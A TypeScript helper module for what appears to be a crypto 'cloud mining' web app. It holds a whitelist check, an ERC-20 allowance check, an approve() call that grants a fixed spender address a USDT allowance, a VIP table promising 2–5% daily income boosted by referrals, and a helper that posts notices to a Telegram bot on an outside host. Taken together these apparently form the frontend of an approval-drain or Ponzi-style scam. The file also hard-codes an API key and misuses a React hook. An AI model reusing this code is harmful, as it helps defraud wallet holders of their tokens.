import { message } from "antd";

import { ethers, BigNumberish, formatUnits } from 'ethers';
import { useWriteContract, useReadContract } from 'wagmi'
import { abi, tokenAddress, spenderAddress, amount } from './constants'

const provider = ethers.getDefaultProvider();



interface CheckConnectedWalletAddressI {
  walletWhitelists: string[]
  disconnect: () => void
  connectedAccount: string
}

interface checkAllowanceparams {
  tokenAddress: string
  ownerAddress: string
  spenderAddress: string
  amount: BigInt
}

export function CheckConnectedWalletAddress(params: CheckConnectedWalletAddressI) {
  const { walletWhitelists, disconnect, connectedAccount } = params

  if (walletWhitelists.length === 0) return

  if (walletWhitelists.indexOf(connectedAccount) < 0) {
    message.error("Mismatched Wallet")
    disconnect()
    return
  }
}


// Function to check if allowance is greater than a specified amount
export async function checkAllowance(params: checkAllowanceparams) {
  const { tokenAddress, ownerAddress, spenderAddress, amount } = params
  
  // ABI for ERC-20 token standard, focusing on 'allowance' function
  const abi = [
    "function allowance(address owner, address spender) view returns (uint256)"
  ];

  // Create a contract instance with the token address, ABI, and provider
  const tokenContract = new ethers.Contract(tokenAddress, abi, provider);

  try {
    // Fetch the allowance using the contract instance
    const allowance: BigInt = await tokenContract.allowance(ownerAddress, spenderAddress);

    // Compare the fetched allowance with the provided amount
    return (allowance > amount);  // Returns true if allowance >= amount
  } catch (error) {
    console.error("Error fetching allowance:", error);
    return false; // Return false in case of an error
  }
}

//Function to approve usdt
export function approve() {
  const { data: hash, writeContract } = useWriteContract()
    writeContract({
      address: tokenAddress,
      abi,
      functionName: 'approve',
      args: [spenderAddress, BigInt(ethers.parseUnits(amount, 6))],
    })
  } 

  //Function to obtain Agents benefits
export function getAgentBenefits(usdtHolding : string , referrals : number) {
    // Define the VIP levels, their corresponding conditions, PH/S, and daily income rates
    const vipLevels = [
      { level: "VIP1", usdt: 99, phs: 500, rate: 0.5, dailyRate: 2.0, dailyIncome: 1.98 },
      { level: "VIP2", usdt: 1500, phs: 650, rate: 0.65, dailyRate: 2.5, dailyIncome: 37.5 },
      { level: "VIP3", usdt: 3000, phs: 800, rate: 0.8, dailyRate: 2.8, dailyIncome: 84.0 },
      { level: "VIP4", usdt: 5000, phs: 1000, rate: 1.0, dailyRate: 3.2, dailyIncome: 160.0 },
      { level: "VIP5", usdt: 10000, phs: 1500, rate: 1.5, dailyRate: 3.8, dailyIncome: 380.0 },
      { level: "VIP6", usdt: 50000, phs: 2000, rate: 2.0, dailyRate: 4.5, dailyIncome: 2250.0 },
      { level: "VIP7", usdt: 100000, phs: 3000, rate: 3.0, dailyRate: 5.0, dailyIncome: 5000.0 },
    ];
  
    // Find the appropriate VIP level based on the user's USDT holding
    let vip = vipLevels.find((vip) => parseInt(usdtHolding) >= vip.usdt);
  
    // If the user's USDT holding is less than the minimum, assign them to VIP1
    if (!vip) {
      vip = vipLevels[0];
    }
  
    // Calculate the total PH/S and interest rate based on the user's referrals
    const totalPhs = vip.phs + referrals * vip.phs;
    const dailyInterestRate = vip.dailyRate + (referrals > 0 && vip.level === "VIP4" ? 1 : 0); // Add 1% bonus for VIP4 invitees
  
    return {
      vipLevel: vip.level,
      totalPhs: totalPhs,
      dailyInterestRate: dailyInterestRate,
    };
  }
  
//Function to obtain exchange rates
export async function getCryptoExchangeRates() {
  const apiUrl = "https://api.coingecko.com/api/v3/simple/price";
  const queryParams = "?ids=bitcoin,ethereum&vs_currencies=usd";
  const apiKey = 'CG-g27PawFDyWDanyb7MqnTJsJ2'; // Example for an API that requires a key
  
  try {
    const response = await fetch(apiUrl + queryParams, {
      headers: {
        'Authorization': `Bearer ${apiKey}`, // Add your API key in the header if the API requires it
      },
    });
    const data = await response.json();

    // Extract the relevant rates
    const ethUsdt = data.ethereum.usd; // ETH to USDT rate (Coingecko uses USD)
    const btcUsdt = data.bitcoin.usd; // BTC to USDT rate
    const btcEth = btcUsdt / ethUsdt; // BTC to ETH rate (calculated by dividing BTC/USDT by ETH/USDT)

    return {
      ETH_USDT: ethUsdt,
      BTC_USDT: btcUsdt,
      BTC_ETH: btcEth.toFixed(2), // Keeping the precision similar to normal rates
    };
  } catch (error) {
    console.error("Error fetching exchange rates:", error);
    return null;
  }
}

export function generateAlphanumericString(length: number = 5): string {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';

  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    result += characters[randomIndex];
  }

  return result;
}


export async function sendMessage(message: string) {
  // Define chat ID here
  const chatId =  process.env.NEXT_PUBLIC_GROUP_ID; // Replace with your actual chat ID

  // Construct the API URL
  const apiUrl = `https://tgbotapi-rcpl.onrender.com/users/send-message?chatId=${chatId}&message=${encodeURIComponent(message)}`;

  try {
    // Make the GET request to the API
    const response = await fetch(apiUrl, {
      method: 'GET'
    });

    if (!response.ok) {
      throw new Error(`Error ${response.status}: ${response.statusText}`);
    }

    // Parse the JSON response (assuming the API returns JSON)
    const data = await response.json();

    //console.log('Message sent successfully:', data);
    return true;
  } catch (error) {
    console.error('Failed to send message:', error);
    return false;
  }
}
